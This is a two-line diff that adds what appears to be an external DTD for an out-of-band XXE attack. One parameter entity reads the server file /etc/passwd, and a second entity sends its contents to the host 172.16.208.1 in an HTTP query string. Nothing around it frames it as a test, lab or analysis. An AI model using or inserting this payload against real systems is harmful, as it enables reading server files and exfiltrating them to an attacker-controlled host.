@@ -1,0 +1,2 @@
+<!ENTITY % entity SYSTEM "file:///etc/passwd">
+<!ENTITY % content "<!ENTITY xxeEntity SYSTEM 'http://172.16.208.1/?%entity;'>">
